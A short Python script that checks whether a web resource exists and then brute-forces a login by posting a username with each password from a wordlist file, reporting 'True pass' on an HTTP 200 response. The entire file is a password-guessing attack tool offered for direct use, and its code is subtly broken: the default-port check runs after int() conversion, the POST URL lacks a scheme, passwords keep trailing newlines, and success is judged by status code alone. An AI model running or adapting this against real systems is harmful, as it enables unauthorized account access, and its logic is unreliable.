import http.client, urllib.parse, sys
import requests

print("** This program returns 'exist' if the specific resource exists **\n")

host = input("Insert the host/IP: ")
port = int(input("Insert the port (default:80): "))
resource = input("Insert the resource you want to brute: ")
username = input("Insert username: ")


if (port == ""):
    port = 80
    
try:
    connection = http.client.HTTPConnection(host, port)
    connection.request('GET', resource)
    response1 = connection.getresponse()
    print("Status = ", response1.status)
    if (response1.status == 200):
        print("** EXISTS **")
        try:
            pass_file = open(sys.argv[1], 'r')
            passes = pass_file.readlines()
            for password in passes:
                params = {'username':username, 'password': password}
                response = requests.post(host + resource, params = params)
                if (response.status_code == 200):
                    print("True pass")
        except:
            print("Something went wrong with the file")
    else:
        print("Doesn't exist")
    connection.close()
except ConnectionRefusedError:
    print('Connection failed!')